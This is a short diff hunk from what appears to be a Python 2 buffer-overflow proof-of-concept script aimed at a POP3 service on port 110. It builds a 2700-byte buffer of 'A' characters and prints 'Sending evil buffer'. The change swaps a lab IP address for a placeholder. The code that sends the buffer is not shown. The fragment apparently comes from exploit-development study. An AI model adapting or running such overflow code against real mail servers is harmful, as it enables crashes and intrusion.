@@ -7,7 +7,7 @@ buffer = "A"*2700
 
 try:
 	print "\Sending evil buffer..."
-	s.connect(('10.11.13.120',110))
+	s.connect(('<TARGET_IP_ADDRESS>',110))
 	data = s.recv(1024)
 	s.send('USER username' +'\r\n')
 	data = s.recv(1024)
